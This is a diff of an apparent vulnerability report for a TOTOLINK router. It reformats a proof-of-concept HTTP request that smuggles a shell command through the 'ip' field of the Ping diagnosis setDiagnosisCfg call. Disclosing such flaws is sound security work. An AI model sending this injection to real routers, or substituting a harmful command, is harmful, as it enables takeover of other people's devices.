@@ -7,7 +7,8 @@ Vendor Homepage:https://www.totolink.net/
 POC:  
 After the administrator logs in, enter "system tools" - > "Ping diagnosis" page  
 执行tls>/tmp/1.txt命令  
-``POST /cgi-bin/cstecgi.cgi HTTP/1.1
+<code>
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
 Host: 192.168.0.1
 Content-Length: 52
 Accept: application/json, text/javascript, */*; q=0.01
@@ -21,7 +22,8 @@ Accept-Language: en-US,en;q=0.9
 Cookie: SESSION_ID=2:1591951611:2
 Connection: close
 
-{"ip":"aaaa\tls>/tmp/1.txt","num":"2","topicurl":"setDiagnosisCfg"}``  
+{"ip":"aaaa\tls>/tmp/1.txt","num":"2","topicurl":"setDiagnosisCfg"}  
+</code>
 
 Analysis Report: 
 In the setdiagnosicfg function, the value string corresponding to the IP in the JSON data is directly put into V6  
